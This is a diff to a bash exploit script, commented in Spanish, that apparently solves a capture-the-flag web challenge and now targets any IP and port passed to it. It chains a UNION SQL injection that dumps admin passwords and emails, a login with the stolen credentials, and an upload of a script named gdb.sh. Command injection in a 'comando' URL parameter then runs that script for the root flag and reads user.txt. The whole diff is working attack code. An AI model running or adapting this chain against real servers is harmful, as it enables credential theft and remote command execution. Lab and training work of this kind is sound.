@@ -1,7 +1,20 @@
 #!/bin/bash
 
+# Verificar que se proporcionen los parámetros IP y puerto
+if [ "$#" -ne 2 ]; then
+    echo "Uso: $0 <ip_del_servidor> <puerto_del_servidor>"
+    exit 1
+fi
+
+# Asignar los parámetros a variables
+server_ip=$1
+server_port=$2
+
+# Base URL para las consultas
+base_url="http://$server_ip:$server_port/web/final"
+
 # URL para obtener los datos de la consulta SQL
-fetch_url="http://localhost/web/final/ulio-html/listadoFotosRovers.php?rover_id=%27e%27%20UNION%20SELECT%20fa.contrasena,%20fa.gmail,%201,%202,%203%20FROM%20final_usuarios%20fa,%20final_administradores%20f%20WHERE%20f.usuario_id%20=%20fa.id"
+fetch_url="$base_url/ulio-html/listadoFotosRovers.php?rover_id=%27e%27%20UNION%20SELECT%20fa.contrasena,%20fa.gmail,%201,%202,%203%20FROM%20final_usuarios%20fa,%20final_administradores%20f%20WHERE%20f.usuario_id%20=%20fa.id"
 
 # Realizar la solicitud con curl y guardar la respuesta
 response=$(curl -s "$fetch_url")
@@ -23,7 +36,7 @@ output_file="credentials.txt"
 #echo "Datos guardados en $output_file"
 
 # URL para el login con los valores extraídos
-login_url="http://localhost/web/final/loginConMod/login.php"
+login_url="$base_url/loginConMod/login.php"
 
 # Realizar el login con los datos extraídos usando curl
 # Guardamos las cookies para mantener la sesión en un archivo cookies.txt
@@ -36,9 +49,10 @@ curl -X POST \
 
 # Mostrar la respuesta del login
 #echo "Login completado, cookies guardadas."
-curl -X POST -F "profile_picture=@gdb.sh" http://localhost/web/final/dashmin/upload.php
+curl -X POST -F "profile_picture=@gdb.sh" "$base_url/dashmin/upload.php"
+
 # 1. URL para obtener los archivos y ejecutar el comando para obtener la flag_root
-files_url_root="http://localhost/web/final/dashmin/list_uploads.php?comando=ls%20uploads%3B%20cd%20uploads;chmod%20744%20gdb.sh;./gdb.sh"
+files_url_root="$base_url/dashmin/list_uploads.php?comando=ls%20uploads%3B%20cd%20uploads;chmod%20744%20gdb.sh;./gdb.sh"
 
 # Realizar la solicitud y almacenar la respuesta
 files_response_root=$(curl -s -b cookies.txt "$files_url_root")
@@ -54,7 +68,7 @@ echo "FLAG ROOT: $flag_root"
 #echo "Flag root guardada en $flag_root_file"
 
 # 2. URL para obtener los archivos y ejecutar el comando para obtener la flag_usuario
-files_url_usuario="http://localhost/web/final/dashmin/list_uploads.php?comando=ls%20uploads;cd;cd%20..;%20cat%20/home/www-data/user.txt"
+files_url_usuario="$base_url/dashmin/list_uploads.php?comando=ls%20uploads;cd;cd%20..;%20cat%20/home/www-data/user.txt"
 
 # Realizar la solicitud y almacenar la respuesta
 files_response_usuario=$(curl -s -b cookies.txt "$files_url_usuario")
